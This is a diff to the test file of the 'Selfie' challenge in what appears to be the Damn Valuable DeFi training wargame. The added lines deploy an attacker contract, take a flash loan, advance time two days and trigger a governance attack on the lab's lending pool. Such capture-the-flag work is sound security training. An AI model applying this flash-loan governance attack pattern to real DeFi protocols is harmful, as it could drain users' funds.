@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
 const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
+const myAttackContract = contract.fromArtifact("AttackerContract");
 
 const { expect } = require('chai');
 
@@ -34,6 +35,11 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        this.attackContract = await myAttackContract.new(this.pool.address,this.governance.address,{from:attacker});
+        await this.attackContract.startFlashLoanTransaction({from:attacker});
+        await time.increase(time.duration.days(2));
+
+        await this.attackContract.initiateAttack();
     });
 
     after(async function () {
